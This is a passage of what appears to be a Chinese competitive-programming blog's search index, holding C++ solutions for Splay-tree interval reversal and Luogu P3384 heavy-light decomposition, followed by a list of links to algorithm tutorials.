class="number">2</span>;</span><br><span class="line">    ch[f][!(mid&lt;f)]=mid;</span><br><span class="line">    fa[mid]=f;</span><br><span class="line">    size[mid]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">build</span>(l,mid<span class="number">-1</span>,mid);</span><br><span class="line">    <span class="built_in">build</span>(mid+<span class="number">1</span>,r,mid);</span><br><span class="line">    <span class="built_in">pushup</span>(mid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> k)</span><span class="comment">//寻找以x为根的子树里第k大的</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">pushdown</span>(x);</span><br><span class="line">    <span class="type">int</span> s=size[ch[x][<span class="number">0</span>]];</span><br><span class="line">    <span class="keyword">if</span>(k==s+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;=s)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(ch[x][<span class="number">0</span>],k);</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(ch[x][<span class="number">1</span>],k-s<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rever</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span><span class="comment">//关于如何从Splay中提取区间请看上文思路中的论文</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="built_in">find</span>(rt,l),y=<span class="built_in">find</span>(rt,r+<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">splay</span>(x,rt);</span><br><span class="line">    <span class="built_in">splay</span>(y,ch[x][<span class="number">1</span>]);</span><br><span class="line">    <span class="type">int</span> z=ch[y][<span class="number">0</span>];</span><br><span class="line">    rev[z]^=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    rt=(n+<span class="number">3</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,n+<span class="number">2</span>,rt);<span class="comment">//区间左右各多加1个数方便提取区间</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> L,R;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;L,&amp;R);</span><br><span class="line">        <span class="built_in">rever</span>(L,R);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n+<span class="number">1</span>;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,<span class="built_in">find</span>(rt,i)<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Splay </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P3384 【模板】树链剖分</title>
      <link href="/2018/02/22/%E6%B4%9B%E8%B0%B7P3384%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/"/>
      <url>/2018/02/22/%E6%B4%9B%E8%B0%B7P3384%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="//www.luogu.org/problemnew/show/P3384">https://www.luogu.org/problemnew/show/P3384</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>已知一棵包含N个结点的树（连通且无环），每个节点上包含一个数值，需要支持以下操作：  </p><ol><li>格式： 1 x y z 表示将树从x到y结点最短路径上所有节点的值都加上z  </li><li>格式： 2 x y 表示求树从x到y结点最短路径上所有节点的值之和  </li><li>格式： 3 x z 表示将以x为根节点的子树内所有节点值都加上z  </li><li>格式： 4 x 表示求以x为根节点的子树内所有节点值之和</li></ol><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>树链剖分裸题。做题时看到与四种操作中的任何一种极为相似的操作，就应该立刻想到树链剖分（并且考虑是否结合线段树解答）。<br>关于树链剖分的介绍请看此处：<a href="//www.cnblogs.com/yyy2015c01/p/8457795.html">信息学竞赛相关优秀文章合集</a>  </p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>具体介绍在注释里。<br>来源：洛谷用户<a href="//www.luogu.org/space/show?uid=47062">@zengqinyi</a>  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Rint register int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem(a,b) memset(a,(b),sizeof(a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Temp template<span class="string">&lt;typename T&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="function">Temp <span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    x=<span class="number">0</span>;T w=<span class="number">1</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch)&amp;&amp;ch!=<span class="string">&#x27;-&#x27;</span>)ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)w=<span class="number">-1</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))x=(x&lt;&lt;<span class="number">3</span>)+(x&lt;&lt;<span class="number">1</span>)+(ch^<span class="string">&#x27;0&#x27;</span>),ch=<span class="built_in">getchar</span>();</span><br><span class="line">    x=x*w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mid ((l+r)&gt;&gt;1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lson rt&lt;&lt;1,l,mid</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rson rt&lt;&lt;1|1,mid+1,r</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> len (r-l+1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">200000</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n,m,r,mod;</span><br><span class="line"><span class="comment">//见题意 </span></span><br><span class="line"><span class="type">int</span> e,beg[maxn],nex[maxn],to[maxn],w[maxn],wt[maxn];</span><br><span class="line"><span class="comment">//链式前向星数组，w[]、wt[]初始点权数组 </span></span><br><span class="line"><span class="type">int</span> a[maxn&lt;&lt;<span class="number">2</span>],laz[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="comment">//线段树数组、lazy操作 </span></span><br><span class="line"><span class="type">int</span> son[maxn],id[maxn],fa[maxn],cnt,dep[maxn],siz[maxn],top[maxn]; </span><br><span class="line"><span class="comment">//son[]重儿子编号,id[]新编号,fa[]父亲节点,cnt dfs_clock/dfs序,dep[]深度,siz[]子树大小,top[]当前链顶端节点 </span></span><br><span class="line"><span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//查询答案 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span> <span class="comment">//链式前向星加边 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    to[++e]=y;</span><br><span class="line">    nex[e]=beg[x];</span><br><span class="line">    beg[x]=e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-------------------------------------- 以下为线段树 </span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">pushdown</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> lenn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    laz[rt&lt;&lt;<span class="number">1</span>]+=laz[rt];</span><br><span class="line">    laz[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=laz[rt];</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>]+=laz[rt]*(lenn-(lenn&gt;&gt;<span class="number">1</span>));</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=laz[rt]*(lenn&gt;&gt;<span class="number">1</span>);</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>]%=mod;</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]%=mod;</span><br><span class="line">    laz[rt]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> l,<span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        a[rt]=wt[l];</span><br><span class="line">        <span class="keyword">if</span>(a[rt]&gt;mod)a[rt]%=mod;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(lson);</span><br><span class="line">    <span class="built_in">build</span>(rson);</span><br><span class="line">    a[rt]=(a[rt&lt;&lt;<span class="number">1</span>]+a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>])%mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> L,<span class="type">int</span> R)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L&lt;=l&amp;&amp;r&lt;=R) &#123;</span><br><span class="line">    res+=a[rt];</span><br><span class="line">    res%=mod;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(laz[rt])<span class="built_in">pushdown</span>(rt,len);</span><br><span class="line">        <span class="keyword">if</span>(L&lt;=mid)<span class="built_in">query</span>(lson,L,R);</span><br><span class="line">        <span class="keyword">if</span>(R&gt;mid)<span class="built_in">query</span>(rson,L,R);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> L,<span class="type">int</span> R,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L&lt;=l&amp;&amp;r&lt;=R) &#123;</span><br><span class="line">        laz[rt]+=k;</span><br><span class="line">        a[rt]+=k*len;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(laz[rt])<span class="built_in">pushdown</span>(rt,len);</span><br><span class="line">        <span class="keyword">if</span>(L&lt;=mid)<span class="built_in">update</span>(lson,L,R,k);</span><br><span class="line">        <span class="keyword">if</span>(R&gt;mid)<span class="built_in">update</span>(rson,L,R,k);</span><br><span class="line">        a[rt]=(a[rt&lt;&lt;<span class="number">1</span>]+a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>])%mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//---------------------------------以上为线段树 </span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">qRange</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(top[x]!=top[y]) &#123;<span class="comment">//当两个点不在同一条链上 </span></span><br><span class="line">        <span class="keyword">if</span>(dep[top[x]]&lt;dep[top[y]])</span><br><span class="line">        <span class="built_in">swap</span>(x,y);<span class="comment">//把x点改为所在链顶端的深度更深的那个点</span></span><br><span class="line">        res=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[top[x]],id[x]);<span class="comment">//ans加上x点到x所在链顶端 这一段区间的点权和</span></span><br><span class="line">        ans+=res;</span><br><span class="line">        ans%=mod;<span class="comment">//按题意取模 </span></span><br><span class="line">        x=fa[top[x]];<span class="comment">//把x跳到x所在链顶端的那个点的上面一个点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//直到两个点处于一条链上</span></span><br><span class="line">    <span class="keyword">if</span>(dep[x]&gt;dep[y])<span class="built_in">swap</span>(x,y);<span class="comment">//把x点深度更深的那个点</span></span><br><span class="line">    res=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[y]);<span class="comment">//这时再加上此时两个点的区间和即可</span></span><br><span class="line">    ans+=res;</span><br><span class="line">    <span class="keyword">return</span> ans%mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">updRange</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> k)</span> <span class="comment">//同上</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    k%=mod;</span><br><span class="line">    <span class="keyword">while</span>(top[x]!=top[y])&#123;</span><br><span class="line">        <span class="keyword">if</span>(dep[top[x]]&lt;dep[top[y]])</span><br><span class="line">        <span class="built_in">swap</span>(x,y);</span><br><span class="line">        <span class="built_in">update</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[top[x]],id[x],k);</span><br><span class="line">        x=fa[top[x]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dep[x]&gt;dep[y])<span class="built_in">swap</span>(x,y);</span><br><span class="line">    <span class="built_in">update</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[y],k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">qSon</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    res=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[x]+siz[x]<span class="number">-1</span>);<span class="comment">//子树区间右端点为id[x]+siz[x]-1 </span></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">updSon</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> k)</span> <span class="comment">//同上</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="built_in">update</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[x]+siz[x]<span class="number">-1</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">dfs1</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> f,<span class="type">int</span> deep)</span> <span class="comment">//x当前节点，f父亲，deep深度 </span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    dep[x]=deep;<span class="comment">//标记每个点的深度 </span></span><br><span class="line">    fa[x]=f;<span class="comment">//标记每个点的父亲 </span></span><br><span class="line">    siz[x]=<span class="number">1</span>;<span class="comment">//标记每个非叶子节点的子树大小 </span></span><br><span class="line">    <span class="type">int</span> maxson=<span class="number">-1</span>;<span class="comment">//记录重儿子的儿子数 </span></span><br><span class="line">    <span class="keyword">for</span>(Rint i=beg[x];i;i=nex[i]) &#123;</span><br><span class="line">        <span class="type">int</span> y=to[i];</span><br><span class="line">        <span class="keyword">if</span>(y==f)</span><br><span class="line">        <span class="keyword">continue</span>;<span class="comment">//若为父亲则continue </span></span><br><span class="line">        <span class="built_in">dfs1</span>(y,x,deep+<span class="number">1</span>);<span class="comment">//dfs其儿子 </span></span><br><span class="line">        siz[x]+=siz[y];<span class="comment">//把它的儿子数加到它身上 </span></span><br><span class="line">        <span class="keyword">if</span>(siz[y]&gt;maxson)son[x]=y,maxson=siz[y];<span class="comment">//标记每个非叶子节点的重儿子编号 </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> topf)</span> <span class="comment">//x当前节点，topf当前链的最顶端的节点 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    id[x]=++cnt;<span class="comment">//标记每个点的新编号 </span></span><br><span class="line">    wt[cnt]=w[x];<span class="comment">//把每个点的初始值赋到新编号上来 </span></span><br><span class="line">    top[x]=topf;<span class="comment">//这个点所在链的顶端 </span></span><br><span class="line">    <span class="keyword">if</span>(!son[x])</span><br><span class="line">    <span class="keyword">return</span>;<span class="comment">//如果没有儿子则返回 </span></span><br><span class="line">    <span class="built_in">dfs2</span>(son[x],topf);<span class="comment">//按先处理重儿子，再处理轻儿子的顺序递归处理 </span></span><br><span class="line">    <span class="keyword">for</span>(Rint i=beg[x];i;i=nex[i]) &#123;</span><br><span class="line">        <span class="type">int</span> y=to[i];</span><br><span class="line">        <span class="keyword">if</span>(y==fa[x]||y==son[x])<span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">dfs2</span>(y,y);<span class="comment">//对于每一个轻儿子都有一条从它自己开始的链 </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n);</span><br><span class="line">    <span class="built_in">read</span>(m);</span><br><span class="line">    <span class="built_in">read</span>(r);</span><br><span class="line">    <span class="built_in">read</span>(mod);</span><br><span class="line">    <span class="keyword">for</span>(Rint i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">read</span>(w[i]);</span><br><span class="line">    <span class="keyword">for</span>(Rint i=<span class="number">1</span>;i&lt;n;i++) &#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        <span class="built_in">read</span>(a);<span class="built_in">read</span>(b);</span><br><span class="line">        <span class="built_in">add</span>(a,b);<span class="built_in">add</span>(b,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs1</span>(r,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dfs2</span>(r,r);</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">while</span>(m--) &#123;</span><br><span class="line">        <span class="type">int</span> k,x,y,z;</span><br><span class="line">        <span class="built_in">read</span>(k);</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);<span class="built_in">read</span>(y);<span class="built_in">read</span>(z);</span><br><span class="line">            <span class="built_in">updRange</span>(x,y,z);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(k==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);<span class="built_in">read</span>(y);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">qRange</span>(x,y));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(k==<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);<span class="built_in">read</span>(y);</span><br><span class="line">            <span class="built_in">updSon</span>(x,y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">qSon</span>(x));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数链剖分 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息学竞赛相关优秀文章合集</title>
      <link href="/2018/02/21/%E4%BF%A1%E6%81%AF%E5%AD%A6%E7%AB%9E%E8%B5%9B%E7%9B%B8%E5%85%B3%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/"/>
      <url>/2018/02/21/%E4%BF%A1%E6%81%AF%E5%AD%A6%E7%AB%9E%E8%B5%9B%E7%9B%B8%E5%85%B3%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p><a href="//blog.csdn.net/zearot/article/details/48299459">线段树详解 （原理，实现与应用）</a><br><a href="//blog.csdn.net/lyd_7_29/article/details/51405469">可持久化线段树 简介</a>  </p><p><a href="//files.cnblogs.com/files/yyy2015c01/%E8%BF%90%E7%94%A8%E4%BC%B8%E5%B1%95%E6%A0%91%E8%A7%A3%E5%86%B3%E6%95%B0%E5%88%97%E7%BB%B4%E6%8A%A4%E9%97%AE%E9%A2%98.pdf">运用伸展树解决数列维护问题.pdf</a><br><a href="//oi.men.ci/splay-notes-1/">Splay 学习笔记（一）</a><br><a href="//oi.men.ci/splay-notes-2/">Splay 学习笔记（二）</a><br><a href="//oi.men.ci/splay-notes-3/">Splay 学习笔记（三）</a>   </p><p><a href="//lib.csdn.net/article/datastructure/9204">请要相信我，30分钟让你掌握AVL树（平衡二叉树）</a><br><a href="//blog.csdn.net/sun_tttt/article/details/65445754">最容易懂的红黑树</a><br><a href="//www.cnblogs.com/Mathics/p/3971220.html">三大平衡树（Treap + Splay + SBT）总结+模板</a><br><a href="//oi.men.ci/link-cut-tree-notes/">Link-Cut Tree 学习笔记</a><br><a href="//files.cnblogs.com/files/yyy2015c01/%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A0%94%E7%A9%B6.pdf">可持久化数据结构研究.pdf</a>  </p><p><a href="//www.cnblogs.com/dalt/p/8206664.html">树链剖分详解</a><br><a href="//www.cnblogs.com/chinhhh/p/7965433.html">树链剖分详解（洛谷模板 P3384）</a>  </p><p><a href="//blog.csdn.net/PomeCat/article/details/72832494">动态规划（DP）优化之斜率优化讲解</a><br><a href="//www.cnblogs.com/MashiroSky/p/6009685.html">斜率优化学习笔记</a><br><a href="//www.cnblogs.com/mlystdcall/p/6525962.html">四边形不等式学习笔记</a><br><a href="//www.yhzq-blog.cc/%E6%8F%92%E5%A4%B4dp-%E4%BB%8E%E4%B8%8D%E4%BC%9A%E5%88%B0%E5%B4%A9%E6%BA%83/">插头dp入门</a>  </p><p><a href="//segmentfault.com/a/1190000003914228">最长回文子串——Manacher 算法（人称“马拉车算法”）</a>  </p><p><a href="//www.cnblogs.com/mlystdcall/p/6734852.html">上下界网络流建模方法总结</a>   </p><p><a href="//www.gatevin.moe/acm/fft%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">FFT算法学习笔记</a><br><a href="//www.cnblogs.com/tmzbot/p/4668158.html">Fast Walsh-Hadamard 